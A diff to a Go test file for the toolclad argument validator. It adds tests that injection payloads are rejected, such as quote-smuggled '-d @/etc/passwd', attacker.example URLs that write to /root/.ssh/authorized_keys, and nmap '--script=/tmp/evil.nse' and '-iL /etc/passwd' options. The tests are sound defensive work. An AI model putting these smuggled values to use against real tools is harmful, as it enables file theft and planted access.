@@ -7,7 +7,7 @@ import (
 	"github.com/thirdkeyai/toolclad/pkg/manifest"
 )
 
-func intPtr(v int) *int         { return &v }
+func intPtr(v int) *int           { return &v }
 func floatPtr(v float64) *float64 { return &v }
 
 func TestValidateArg(t *testing.T) {
@@ -559,7 +559,10 @@ func TestNumberType(t *testing.T) {
 		wantErr bool
 	}{
 		{"valid float", &manifest.ArgDef{Name: "n", Type: "number"}, "0.5", false},
-		{"negative", &manifest.ArgDef{Name: "n", Type: "number"}, "-3.14", false},
+		// A negative output starts with '-' and is rejected by the
+		// leading-dash rule unless the arg opts in.
+		{"negative rejected by leading-dash rule", &manifest.ArgDef{Name: "n", Type: "number"}, "-3.14", true},
+		{"negative with allow_leading_dash", &manifest.ArgDef{Name: "n", Type: "number", AllowLeadingDash: true}, "-3.14", false},
 		{"NaN rejected", &manifest.ArgDef{Name: "n", Type: "number"}, "NaN", true},
 		{"Inf rejected", &manifest.ArgDef{Name: "n", Type: "number"}, "Inf", true},
 		{"non-numeric", &manifest.ArgDef{Name: "n", Type: "number"}, "abc", true},
@@ -665,5 +668,195 @@ func TestCheckInjection(t *testing.T) {
 				t.Errorf("unexpected error: %v", err)
 			}
 		})
+	}
+}
+
+// TC-1: argument values that smuggle extra options through quoting or
+// whitespace must be rejected outright by the string-derived hygiene rules.
+func TestTC1PayloadsRejected(t *testing.T) {
+	cases := []struct{ typ, value string }{
+		{"string", "' -d @/etc/passwd"},
+		{"string", "X: y' -d @/etc/passwd -H 'Z: w"},
+		{"url", "https://attacker.example/ -o /root/.ssh/authorized_keys"},
+		{"url", "https://attacker.example/ -o /tmp/pwned"},
+	}
+	for _, c := range cases {
+		t.Run(c.typ+"/"+c.value, func(t *testing.T) {
+			def := &manifest.ArgDef{Name: "v", Type: c.typ}
+			if got, err := ValidateArg(def, c.value); err == nil {
+				t.Fatalf("template mode: expected rejection, got %q", got)
+			}
+			// Opting in to whitespace in exec mode must not rescue these:
+			// quotes stay banned and url never allows whitespace.
+			def.AllowWhitespace = true
+			if got, err := ValidateArgMode(def, c.value, true); err == nil {
+				t.Fatalf("exec mode with allow_whitespace: expected rejection, got %q", got)
+			}
+		})
+	}
+}
+
+// TC-2: option-looking values must never reach the tool as options.
+func TestTC2PayloadsRejected(t *testing.T) {
+	values := []string{
+		"-iL /etc/passwd",
+		"--script=/tmp/evil.nse",
+		"--script http-fetch --script-args http-fetch.destination=/tmp/d",
+	}
+	for _, v := range values {
+		t.Run(v, func(t *testing.T) {
+			def := &manifest.ArgDef{Name: "v", Type: "string"}
+			if got, err := ValidateArg(def, v); err == nil {
+				t.Fatalf("expected rejection, got %q", got)
+			}
+			def.AllowWhitespace = true
+			if got, err := ValidateArgMode(def, v, true); err == nil {
+				t.Fatalf("exec mode with allow_whitespace: expected rejection (leading dash), got %q", got)
+			}
+		})
+	}
+}
+
+// TC-3: the leading-dash rule across types, and the allow_leading_dash opt-in.
+func TestTC3LeadingDashRejected(t *testing.T) {
+	const msg = "must not start with '-' or '+' (set allow_leading_dash = true to permit)"
+	cases := []struct{ typ, value string }{
+		{"path", "-rf"},
+		{"string", "--output=/etc/cron.d/x"},
+		{"integer", "-1"},
+		{"string", "+short"},
+		{"number", "-0.5"},
+		{"duration", "-5"},
+		{"msf_options", "-RHOSTS 10.0.0.1"},
+	}
+	for _, c := range cases {
+		t.Run(c.typ+"/"+c.value, func(t *testing.T) {
+			_, err := ValidateArg(&manifest.ArgDef{Name: "v", Type: c.typ}, c.value)
+			if err == nil {
+				t.Fatalf("expected rejection")
+			}
+			if !strings.Contains(err.Error(), msg) {
+				t.Fatalf("error %q does not contain %q", err.Error(), msg)
+			}
+		})
+	}
+
+	got, err := ValidateArg(&manifest.ArgDef{Name: "v", Type: "string", AllowLeadingDash: true}, "-v")
+	if err != nil || got != "-v" {
+		t.Errorf("allow_leading_dash should permit -v, got %q, %v", got, err)
+	}
+	got, err = ValidateArg(&manifest.ArgDef{Name: "v", Type: "integer", AllowLeadingDash: true}, "-1")
+	if err != nil || got != "-1" {
+		t.Errorf("allow_leading_dash should permit -1, got %q, %v", got, err)
+	}
+	// The numeric rule applies to the output value: clamping to a
+	// non-negative minimum rescues a negative input.
+	got, err = ValidateArg(&manifest.ArgDef{Name: "v", Type: "integer", Min: intPtr(1), Clamp: true}, "-5")
+	if err != nil || got != "1" {
+		t.Errorf("clamped negative should yield 1, got %q, %v", got, err)
+	}
+}
+
+func TestValueHygiene(t *testing.T) {
+	str := func(allowWS bool) *manifest.ArgDef {
+		return &manifest.ArgDef{Name: "v", Type: "string", AllowWhitespace: allowWS}
+	}
+	tests := []struct {
+		name     string
+		def      *manifest.ArgDef
+		value    string
+		execMode bool
+		wantErr  string
+		want     string
+	}{
+		{name: "NUL in enum", def: &manifest.ArgDef{Name: "v", Type: "enum", Allowed: []string{"syn\x00"}}, value: "syn\x00", wantErr: "must not contain NUL bytes"},
+		{name: "NUL in integer", def: &manifest.ArgDef{Name: "v", Type: "integer"}, value: "1\x00", wantErr: "must not contain NUL bytes"},
+		{name: "NUL in boolean", def: &manifest.ArgDef{Name: "v", Type: "boolean"}, value: "true\x00", wantErr: "must not contain NUL bytes"},
+		{name: "control char", def: str(false), value: "a\x01b", wantErr: "must not contain control characters"},
+		{name: "DEL", def: str(false), value: "a\x7fb", wantErr: "must not contain control characters"},
+		{name: "tab without opt-in", def: str(false), value: "a\tb", wantErr: "must not contain control characters"},
+		{name: "double quote", def: str(false), value: `a"b`, wantErr: "must not contain quote or backslash characters"},
+		{name: "single quote", def: str(false), value: "a'b", wantErr: "must not contain quote or backslash characters"},
+		{name: "backslash", def: str(false), value: `a\b`, wantErr: "must not contain quote or backslash characters"},
+		{name: "scope_target backslash keeps specific message", def: &manifest.ArgDef{Name: "v", Type: "scope_target"}, value: `a\b`, wantErr: "backslash escape sequences"},
+		{name: "space", def: str(false), value: "a b", wantErr: "must not contain whitespace"},
+		{name: "nbsp", def: str(false), value: "a b", wantErr: "must not contain whitespace"},
+		{name: "allow_whitespace ignored in template mode", def: str(true), value: "a b", execMode: false, wantErr: "must not contain whitespace"},
+		{name: "allow_whitespace honored in exec mode", def: str(true), value: "a b", execMode: true, want: "a b"},
+		// allow_whitespace permits only the ASCII space; control characters
+		// are rejected unconditionally and exotic spaces stay rejected.
+		{name: "allow_whitespace tab still rejected", def: str(true), value: "a\tb", execMode: true, wantErr: "must not contain control characters"},
+		{name: "allow_whitespace newline still rejected", def: str(true), value: "a\nb", execMode: true, wantErr: "must not contain control characters"},
+		{name: "allow_whitespace CR still rejected", def: str(true), value: "a\rb", execMode: true, wantErr: "must not contain control characters"},
+		{name: "allow_whitespace vertical tab still rejected", def: str(true), value: "a\vb", execMode: true, wantErr: "must not contain control characters"},
+		{name: "allow_whitespace form feed still rejected", def: str(true), value: "a\fb", execMode: true, wantErr: "must not contain control characters"},
+		{name: "allow_whitespace nbsp still rejected", def: str(true), value: "a\u00a0b", execMode: true, wantErr: "must not contain whitespace"},
+		{name: "allow_whitespace line separator still rejected", def: str(true), value: "a\u2028b", execMode: true, wantErr: "must not contain whitespace"},
+		{name: "allow_whitespace ideographic space still rejected", def: str(true), value: "a\u3000b", execMode: true, wantErr: "must not contain whitespace"},
+		{name: "C1 control rejected", def: str(true), value: "a\u0085b", execMode: true, wantErr: "must not contain control characters"},
+		{name: "msf_options tab rejected", def: &manifest.ArgDef{Name: "v", Type: "msf_options"}, value: "RHOSTS\t10.0.0.1", wantErr: "must not contain control characters"},
+		{name: "msf_options nbsp rejected", def: &manifest.ArgDef{Name: "v", Type: "msf_options"}, value: "RHOSTS\u00a010.0.0.1", wantErr: "must not contain whitespace"},
+		{name: "url never allows whitespace", def: &manifest.ArgDef{Name: "v", Type: "url", AllowWhitespace: true}, value: "https://example.com/a b", execMode: true, wantErr: "must not contain whitespace"},
+		{name: "msf_options exempt from whitespace rule", def: &manifest.ArgDef{Name: "v", Type: "msf_options"}, value: "RHOSTS 10.0.0.1", want: "RHOSTS 10.0.0.1"},
+		{name: "msf_options still rejects quotes", def: &manifest.ArgDef{Name: "v", Type: "msf_options"}, value: "RHOSTS 'x'", wantErr: "must not contain quote or backslash characters"},
+		{name: "path with space rejected", def: &manifest.ArgDef{Name: "v", Type: "path"}, value: "my file.txt", wantErr: "must not contain whitespace"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got, err := ValidateArgMode(tt.def, tt.value, tt.execMode)
+			if tt.wantErr != "" {
+				if err == nil {
+					t.Fatalf("expected error containing %q, got value %q", tt.wantErr, got)
+				}
+				if !strings.Contains(err.Error(), tt.wantErr) {
+					t.Fatalf("error %q does not contain %q", err.Error(), tt.wantErr)
+				}
+				return
+			}
+			if err != nil {
+				t.Fatalf("unexpected error: %v", err)
+			}
+			if got != tt.want {
+				t.Errorf("got %q, want %q", got, tt.want)
+			}
+		})
+	}
+}
+
+func TestPatternAnchoring(t *testing.T) {
+	str := &manifest.ArgDef{Name: "v", Type: "string", Pattern: "[a-z]+"}
+	if _, err := ValidateArg(str, "abc123"); err == nil {
+		t.Error("unanchored pattern [a-z]+ must reject abc123")
+	}
+	if got, err := ValidateArg(str, "abc"); err != nil || got != "abc" {
+		t.Errorf("pattern [a-z]+ should accept abc, got %q, %v", got, err)
+	}
+	rm := &manifest.ArgDef{Name: "v", Type: "regex_match", Pattern: "[a-z]+"}
+	if _, err := ValidateArg(rm, "abc123"); err == nil {
+		t.Error("regex_match with [a-z]+ must reject abc123")
+	}
+	custom := map[string]*manifest.CustomTypeDef{"lower": {Base: "string", Pattern: "[a-z]+"}}
+	if _, err := ValidateArgWithCustomTypes(&manifest.ArgDef{Name: "v", Type: "lower"}, "abc123", custom); err == nil {
+		t.Error("custom type pattern [a-z]+ must reject abc123")
+	}
+	// Custom types go through hygiene too.
+	if _, err := ValidateArgWithCustomTypes(&manifest.ArgDef{Name: "v", Type: "lower"}, "-abc", custom); err == nil {
+		t.Error("custom type must apply the leading-dash rule")
+	}
+}
+
+func TestAnchorPattern(t *testing.T) {
+	cases := map[string]string{
+		"[a-z]+":   "^(?:[a-z]+)$",
+		"^[a-z]+$": "^(?:[a-z]+)$",
+		"^abc":     "^(?:abc)$",
+		"abc$":     "^(?:abc)$",
+		`a\$`:      `^(?:a\$)$`,
+		`a\\$`:     `^(?:a\\)$`,
+	}
+	for in, want := range cases {
+		if got := AnchorPattern(in); got != want {
+			t.Errorf("AnchorPattern(%q) = %q, want %q", in, got, want)
+		}
 	}
 }
